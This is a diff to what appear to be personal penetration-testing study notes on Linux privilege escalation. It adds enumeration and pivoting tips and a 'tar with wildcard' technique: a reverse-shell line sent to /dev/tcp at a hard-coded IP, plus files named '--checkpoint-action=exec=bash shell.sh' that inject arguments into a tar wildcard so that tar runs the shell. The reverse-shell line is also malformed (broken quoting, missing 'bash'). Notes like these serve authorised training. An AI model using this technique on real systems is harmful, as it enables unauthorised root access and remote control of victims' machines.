@@ -16,6 +16,7 @@
   - [SeBackupPrivilege](#sebackupprivilege)
 - [Linux Privilege Escalation](#linux-privilege-escalation)
   - [Linux Manual Enumeration](#linux-manual-enumeration)
+  - [Common Linux Privilege Escalation](#common-linux-privilege-escalation)
 
 # General
 ## Important Files
@@ -253,7 +254,7 @@ hostname
 cat /home/user/.bash_aliases
 cat /home/user/.bash_history
 
-# Enumerate other userse
+# Enumerate other userse(This is really important because we might have to pivot to other users)
 cat /etc/passwd
 
 # Operating system release and version
@@ -301,4 +302,18 @@ cat /etc/fstab
 
 # List all available disks
 lsblk
+```
+
+## Linux Privilege Strategy
+- When current user can't use wget that probably means we need to pivot as someone else
+- See if other person can ssh as root(check important files such as .bash_history, .bash_aliases)
+- If the current user can run webserver on victim machine, it's likely that we can only access that port on the same machine
+- 
+
+## Common Linux Privilege Escalation
+### tar with wilrdcard
+```bash
+echo "/bin/bash -c '-i >& /dev/tcp/192.168.45.175/80 0>&1" > shell.sh
+echo "" > --checkpoint=1
+echo "" > "--checkpoint-action=exec=bash shell.sh"
 ```
